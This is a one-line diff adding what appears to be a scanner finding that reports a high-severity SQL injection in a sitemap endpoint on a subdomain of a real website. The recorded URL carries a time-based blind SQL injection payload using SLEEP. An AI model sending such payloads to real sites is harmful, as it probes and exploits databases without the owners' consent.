@@ -1,0 +1,1 @@
+[sitemap-sql-injection] [http] [high] http://b7609296.xvideos.com/sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)
